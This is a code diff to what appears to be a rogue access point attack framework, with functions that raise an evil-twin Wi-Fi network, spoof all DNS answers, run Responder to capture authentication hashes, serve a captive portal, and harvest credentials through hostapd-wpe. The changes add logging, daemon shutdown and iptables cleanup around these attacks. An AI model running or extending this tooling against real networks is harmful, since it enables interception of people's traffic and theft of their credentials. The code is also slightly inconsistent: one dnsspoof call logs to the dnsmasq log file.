@@ -1,3 +1,5 @@
+#!/usr/bin/env python
+
 import sys
 import os
 import config
@@ -60,21 +62,20 @@ def hostile_portal():
                                             bssid=options['bssid'],
                                             channel=options['channel'],
                                             wpa=options['wpa'])
-        utils.Hostapd.hardstart('-s %s' % config.hostapd_cnf)
+        utils.Hostapd.hardstart('-s %s ' % config.hostapd_cnf, verbose=False)
 
         # configure routing 
         os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0' % options['interface'])
         os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
 
         # start dhcp and dns: all dns queries should resolve to PHY
-        utils.Dnsmasq.hardstart('-C %s' % config.dnsmasq_cnf)
-        utils.Dnsspoof.hardstart('-i %s -f %s' % (options['interface'], config.dnsspoof_cnf))
+        utils.Dnsmasq.hardstart('-C %s > dnsmasq.log 2>&1' % config.dnsmasq_cnf)
+        utils.Dnsspoof.hardstart('-i %s -f %s > dnsspoof.log 2>&1' % (options['interface'], config.dnsspoof_cnf))
 
         # start Responder
         responder = responder.Responder.get_instance()
         responder.configure()
         responder.start()
-        
 
         # set iptables policy, flush all tables for good measure
         utils.Iptables.accept_all()
@@ -87,6 +88,16 @@ def hostile_portal():
 
         # pause execution until use quits
         raw_input('press enter to quit...')
+
+        # kill daemons
+        utils.Hostapd.kill()
+        utils.Dnsmasq.kill()
+        utils.Dnsspoof.kill()
+        
+        # restore iptables to a clean state (policy, flush tables)
+        utils.Iptables.accept_all()
+        utils.Iptables.flush()
+        utils.Iptables.flush('nat')
 
     except KeyboardInterrupt:
     
@@ -122,15 +133,19 @@ def captive_portal():
                                             bssid=options['bssid'],
                                             channel=options['channel'],
                                             wpa=options['wpa'])
-        utils.Hostapd.hardstart('-s %s' % config.hostapd_cnf)
+
+        utils.Hostapd.hardstart('-s %s' % config.hostapd_cnf, verbose=False)
 
         # configure routing 
         os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0' % options['interface'])
         os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
 
         # start dhcp and dns: all dns queries should resolve to PHY
-        utils.Dnsmasq.hardstart('-C %s' % config.dnsmasq_cnf)
-        utils.Dnsspoof.hardstart('-i %s -f %s' % (options['interface'], config.dnsspoof_cnf))
+        utils.Dnsmasq.hardstart('-C %s > dnsmasq.log 2>&1' % config.dnsmasq_cnf)
+        utils.Dnsspoof.hardstart('-i %s -f %s > dnsmasq.log 2>&1' % (options['interface'], config.dnsspoof_cnf))
+
+        # start httpd
+        utils.Httpd.start()
 
         # set iptables policy, flush all tables for good measure
         utils.Iptables.accept_all()
@@ -143,6 +158,19 @@ def captive_portal():
         
         # pause execution until use quits
         raw_input('press enter to quit...')
+
+        # kill daemons
+        utils.Hostapd.kill()
+        utils.Dnsmasq.kill()
+        utils.Dnsspoof.kill()
+
+        # stop services
+        utils.Httpd.stop()
+        
+        # restore iptables to a clean state (policy, flush tables)
+        utils.Iptables.accept_all()
+        utils.Iptables.flush()
+        utils.Iptables.flush('nat')
 
     except KeyboardInterrupt:
 
@@ -157,18 +185,29 @@ def captive_portal():
         utils.Iptables.flush('nat')
 
 def reap_creds():
-    conf_manager.hostapd_wpe_cnf.configure(interface=options['interface'],
-                                    ssid=options['essid'],
-                                    hw_mode=options['hw_mode'],
-                                    bssid=options['bssid'],
-                                    channel=options['channel'],
-                                    wpa=options['wpa'])
-    utils.Hostapd.hardstart(config.hostapd_cnf)
 
-    # pause execution until use quits
-    raw_input('press enter to quit...')
+    try:
+        conf_manager.hostapd_wpe_cnf.configure(interface=options['interface'],
+                                        ssid=options['essid'],
+                                        hw_mode=options['hw_mode'],
+                                        bssid=options['bssid'],
+                                        channel=options['channel'],
+                                        wpa=options['wpa'])
 
-    utils.Hostapd.kill()
+        utils.NetworkManager.stop()
+        utils.wlan_clean()
+        utils.Hostapd.hardstart('-s %s ' % config.hostapd_cnf, verbose=False)
+
+        # pause execution until use quits
+        raw_input('press enter to quit...')
+
+        utils.Hostapd.kill()
+
+    except KeyboardInterrupt:
+    
+        # kill daemons
+        utils.Hostapd.kill()
+        
 
 def set_options():
 
